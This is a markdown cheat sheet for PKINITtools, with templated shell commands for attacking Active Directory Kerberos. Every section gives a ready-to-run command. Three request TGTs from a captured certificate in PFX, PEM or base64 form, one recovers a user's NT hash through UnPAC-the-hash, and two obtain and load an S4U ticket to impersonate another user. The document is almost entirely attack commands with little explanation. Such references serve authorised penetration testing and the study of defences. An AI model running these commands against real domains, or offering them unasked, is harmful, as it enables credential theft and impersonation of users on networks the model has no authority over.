# PKINITtools

## gettgtpkinit.py

### TGT from PFX

Run TGT from PFX with PKINITtools.

```sh title:"PKINITtools Run TGT from PFX"
gettgtpkinit.py -cert-pfx "$pfx_file" -pfx-pass "$pfx_pass" "$domain/$target_samname" "$ccache_file"
```
<!-- cheat
var pfx_file
var pfx_pass
var domain
var target_samname
var ccache_file
-->

### TGT from PEM cert and key

Run TGT from PEM cert and key with PKINITtools.

```sh title:"PKINITtools Run TGT from PEM Cert and Key"
gettgtpkinit.py -cert-pem "$pem_cert" -key-pem "$pem_key" "$domain/$target_samname" "$ccache_file"
```
<!-- cheat
var pem_cert
var pem_key
var domain
var target_samname
var ccache_file
-->

### TGT with base64 PFX

Run TGT with base64 PFX with PKINITtools.

```sh title:"PKINITtools Run TGT with Base64 PFX"
gettgtpkinit.py -pfx-base64 "$pfx_base64" -pfx-pass "$pfx_pass" "$domain/$target_samname" "$ccache_file"
```
<!-- cheat
var pfx_base64
var pfx_pass
var domain
var target_samname
var ccache_file
-->

## getnthash.py

### UnPAC-the-hash

Dump UnPAC the hash with PKINITtools.

```sh title:"PKINITtools Dump UnPAC the Hash"
KRB5CCNAME="$ccache_file" getnthash.py -key "$as_rep_key" "$domain/$target_samname"
```
<!-- cheat
var ccache_file
var as_rep_key
var domain
var target_samname
-->

## gets4uticket.py

### S4U ticket from machine ccache

Run S4U ticket from machine ccache with PKINITtools.

```sh title:"PKINITtools Run S4U Ticket from Machine Ccache"
gets4uticket.py "kerberos+ccache://$domain\\$machine_account:$ccache_file@$dc_fqdn" "$spn@$domain" "$impersonate_user@$domain" "$output_ccache" -v
```
<!-- cheat
var domain
var machine_account
var ccache_file
var dc_fqdn
var spn
var impersonate_user
var output_ccache
-->

### Use S4U ticket

Generate use S4U ticket with PKINITtools.

```sh title:"PKINITtools Generate Use S4U Ticket"
export KRB5CCNAME="$output_ccache"
```
<!-- cheat
var output_ccache
-->
